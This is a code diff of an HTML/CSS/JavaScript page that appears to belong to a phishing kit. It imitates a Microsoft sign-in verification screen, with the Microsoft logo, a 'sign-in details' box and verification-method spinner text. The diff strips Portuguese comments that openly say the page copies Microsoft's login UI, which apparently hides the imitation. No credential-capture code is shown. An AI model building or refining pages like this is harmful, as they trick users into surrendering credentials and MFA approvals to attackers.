@@ -24,7 +24,6 @@
       box-shadow: 0 2px 6px rgba(0,0,0,.12);
     }
 
-    /* Logo — idêntico ao login.html */
     .logo {
       margin-bottom: 24px;
       display: flex;
@@ -52,7 +51,6 @@
       margin-bottom: 20px;
     }
 
-    /* Caixa de detalhes do sign-in detectado — igual ao que o Microsoft mostra */
     .signin-details {
       border: 1px solid #d6d6d6;
       padding: 0;
@@ -86,7 +84,6 @@
     .detail-row .detail-label { color: #666; }
     .detail-row .detail-value { font-weight: 600; color: #1b1b1b; }
 
-    /* Método de verificação */
     .verify-method {
       border: 1px solid #d6d6d6;
       padding: 14px 16px;
@@ -115,7 +112,6 @@
       margin-top: 2px;
     }
 
-    /* Botão — idêntico ao login.html */
     .btn-next {
       display: block;
       width: 100%;
@@ -185,7 +181,6 @@
 
   <div class="container">
 
-    <!-- Logo — idêntico ao login.html -->
     <div class="logo">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 21" width="21" height="21" aria-hidden="true">
         <rect x="1"  y="1"  width="9" height="9" fill="#F35325"/>
@@ -333,7 +328,6 @@
     async function startVerification() {
       document.getElementById("btn-verify").disabled = true;
 
-      // Texto do spinner consoante o método escolhido
       if (selected === "phone") {
         document.getElementById("status-main").textContent = "Sending verification code...";
         document.getElementById("status-sub").textContent  = "A code will be sent to your registered phone number.";
@@ -342,7 +336,6 @@
         document.getElementById("status-sub").textContent  = "Please keep this window open. This may take a few seconds.";
       }
 
-      // Trocar para estado de spinner imediatamente
       document.getElementById("state-initial").style.display   = "none";
       document.getElementById("state-verifying").style.display = "block";
 
